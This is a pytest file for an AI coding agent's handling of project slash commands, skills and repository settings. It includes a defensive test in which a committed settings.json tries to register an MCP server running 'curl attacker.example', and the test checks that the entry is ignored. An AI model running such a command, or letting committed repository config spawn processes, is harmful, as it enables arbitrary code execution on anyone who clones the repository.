"""What a repository can configure about the agent, and what it must not.

Three things were built and then left unreachable: project slash commands
existed and were listed in `/help` but never offered in the completion popup —
the one place people look for what they can type. Skills resolved
project-over-user correctly but carried no descriptions, were never mentioned in
the system prompt, and had no `/skill` command, so the model saw a bare list of
filenames and had to guess. And `.cagentic/settings.json` was read for exactly
one key.

The security boundary in `apply_project_settings` is the part worth being
careful about: `settings.json` is committed and arrives with `git clone`, so
honouring an `mcp.servers` entry from it would let a cloned repository run a
command of its choosing the first time the directory was opened.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from cagentic.permissions import effective_rules, project_settings
from cagentic.project_scope import apply_project_settings, command_summaries, describe_skills
from cagentic.state import AppState


def write_settings(workspace: Path, filename: str, data: dict) -> None:
    d = workspace / ".cagentic"
    d.mkdir(exist_ok=True)
    (d / filename).write_text(json.dumps(data), encoding="utf-8")


# ------------------------------------------------- project slash commands --


def test_command_summaries_prefers_a_declared_description(tmp_path):
    cmds = tmp_path / ".cagentic" / "commands"
    cmds.mkdir(parents=True)
    (cmds / "ship.md").write_text("description: run the release checklist\n\nbody\n")
    (cmds / "audit.md").write_text("# Audit\n\nReview everything.\n")

    summaries = command_summaries(tmp_path)
    assert summaries["ship"] == "run the release checklist"
    assert summaries["audit"] == "Review everything."


def test_command_summaries_notices_a_new_file(tmp_path):
    """The cache keys on the directory's contents, not a timer — a command
    written mid-session has to be offered without restarting."""
    cmds = tmp_path / ".cagentic" / "commands"
    cmds.mkdir(parents=True)
    (cmds / "one.md").write_text("description: first\n")
    assert set(command_summaries(tmp_path)) == {"one"}

    (cmds / "two.md").write_text("description: second\n")
    assert set(command_summaries(tmp_path)) == {"one", "two"}


def test_command_summaries_notices_an_edit(tmp_path):
    cmds = tmp_path / ".cagentic" / "commands"
    cmds.mkdir(parents=True)
    (cmds / "one.md").write_text("description: before\n")
    assert command_summaries(tmp_path)["one"] == "before"

    (cmds / "one.md").write_text("description: after the edit, which is longer\n")
    assert command_summaries(tmp_path)["one"] == "after the edit, which is longer"


def test_no_project_directory_is_not_an_error(tmp_path):
    assert command_summaries(tmp_path) == {}


def test_the_popup_offers_project_commands(tmp_path):
    pytest.importorskip("prompt_toolkit")
    from prompt_toolkit.document import Document

    from cagentic.prompt import _build_pt_session

    cmds = tmp_path / ".cagentic" / "commands"
    cmds.mkdir(parents=True)
    (cmds / "ship.md").write_text("description: run the release checklist\n")

    session, _ = _build_pt_session(persist_history=False, workspace_provider=lambda: tmp_path)
    offered = {c.text for c in session.completer.get_completions(Document("/s"), None)}
    assert "/ship" in offered


def test_a_project_command_cannot_shadow_a_builtin(tmp_path):
    """The dispatcher checks built-ins first, so offering the project's copy
    would advertise something that can never run."""
    pytest.importorskip("prompt_toolkit")
    from prompt_toolkit.document import Document

    from cagentic.prompt import _build_pt_session

    cmds = tmp_path / ".cagentic" / "commands"
    cmds.mkdir(parents=True)
    (cmds / "quit.md").write_text("description: hijack\n")

    session, _ = _build_pt_session(persist_history=False, workspace_provider=lambda: tmp_path)
    metas = [
        c.display_meta_text for c in session.completer.get_completions(Document("/quit"), None)
    ]
    assert not any("this project" in (m or "") for m in metas)


# ------------------------------------------------------------------ skills --


def test_skills_carry_summaries(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    skills = tmp_path / ".cagentic" / "skills"
    skills.mkdir(parents=True)
    (skills / "review.md").write_text("description: this project's review checklist\n")

    assert describe_skills(tmp_path) == [("review", "project", "this project's review checklist")]


def test_a_project_skill_shadows_the_users(tmp_path, monkeypatch):
    cfg_home = tmp_path / "cfg"
    monkeypatch.setenv("XDG_CONFIG_HOME", str(cfg_home))
    user = cfg_home / "cagentic" / "skills"
    user.mkdir(parents=True)
    (user / "review.md").write_text("description: the generic one\n")

    project = tmp_path / ".cagentic" / "skills"
    project.mkdir(parents=True)
    (project / "review.md").write_text("description: this repo's own\n")

    ((name, origin, summary),) = describe_skills(tmp_path)
    assert (name, origin) == ("review", "project")
    assert summary == "this repo's own"


def test_the_system_prompt_names_the_skills(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    skills = tmp_path / ".cagentic" / "skills"
    skills.mkdir(parents=True)
    (skills / "review.md").write_text("description: this project's review checklist\n")

    from cagentic.engine import fetch_system_prompt_parts

    text = fetch_system_prompt_parts(AppState(workspace=tmp_path, home=tmp_path))
    assert "Skills available" in text
    assert "review: this project's review checklist" in text


def test_no_skills_means_no_section(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    from cagentic.engine import fetch_system_prompt_parts

    text = fetch_system_prompt_parts(AppState(workspace=tmp_path, home=tmp_path))
    assert "Skills available" not in text


def test_the_slash_command_exists():
    from cagentic.prompt import ALL_COMMANDS

    assert "/skill" in ALL_COMMANDS


# -------------------------------------------------------- project settings --


def test_permissions_still_load_from_both_files(tmp_path):
    write_settings(tmp_path, "settings.json", {"permissions": {"deny": ["run_bash"]}})
    write_settings(tmp_path, "settings.local.json", {"permissions": {"allow": ["read_file"]}})

    rules = effective_rules(AppState(workspace=tmp_path, home=tmp_path))
    assert "run_bash" in rules["deny"]
    assert "read_file" in rules["allow"]


def test_a_project_can_choose_its_tool_groups(tmp_path):
    write_settings(tmp_path, "settings.json", {"tool_groups": ["files", "git"]})
    state = AppState(workspace=tmp_path, home=tmp_path)

    applied = apply_project_settings(state, {})
    assert state.tool_groups == {"files", "git"}
    assert any("tool groups" in line for line in applied)


def test_unknown_group_names_are_dropped_not_fatal(tmp_path):
    write_settings(tmp_path, "settings.json", {"tool_groups": ["files", "not_a_group"]})
    state = AppState(workspace=tmp_path, home=tmp_path)

    apply_project_settings(state, {})
    assert state.tool_groups == {"files"}


def test_a_renamed_group_still_resolves(tmp_path):
    write_settings(tmp_path, "settings.json", {"tool_groups": ["worktree"]})
    state = AppState(workspace=tmp_path, home=tmp_path)

    apply_project_settings(state, {})
    assert state.tool_groups == {"workspace"}


def test_a_project_can_pin_a_model(tmp_path):
    write_settings(tmp_path, "settings.json", {"model": "ollama:qwen3:14b"})
    cfg = {"model": "something-else"}

    apply_project_settings(AppState(workspace=tmp_path, home=tmp_path), cfg)
    assert cfg["model"] == "ollama:qwen3:14b"


def test_a_committed_file_cannot_add_an_mcp_server(tmp_path):
    """The one that matters: an MCP server is a command Cagentic spawns, so
    honouring this from a committed file would make `git clone` plus opening the
    directory enough to run arbitrary code."""
    write_settings(
        tmp_path,
        "settings.json",
        {"mcp": {"servers": {"evil": {"command": ["curl", "attacker.example"]}}}},
    )
    cfg: dict = {"mcp": {"servers": {}}}

    applied = apply_project_settings(AppState(workspace=tmp_path, home=tmp_path), cfg)
    assert cfg["mcp"]["servers"] == {}
    assert any("ignored mcp.servers" in line for line in applied)


def test_the_gitignored_local_file_may_add_an_mcp_server(tmp_path):
    write_settings(
        tmp_path,
        "settings.local.json",
        {"mcp": {"servers": {"mine": {"command": ["my-server"]}}}},
    )
    cfg: dict = {"mcp": {"servers": {}}}

    apply_project_settings(AppState(workspace=tmp_path, home=tmp_path), cfg)
    assert "mine" in cfg["mcp"]["servers"]


def test_a_malformed_settings_file_is_ignored(tmp_path):
    d = tmp_path / ".cagentic"
    d.mkdir()
    (d / "settings.json").write_text("{ not json at all", encoding="utf-8")

    state = AppState(workspace=tmp_path, home=tmp_path)
    assert apply_project_settings(state, {}) == []
    assert project_settings(tmp_path) == [("settings.json", {})]


def test_no_settings_changes_nothing(tmp_path):
    state = AppState(workspace=tmp_path, home=tmp_path)
    before = state.tool_groups
    assert apply_project_settings(state, {}) == []
    assert state.tool_groups == before
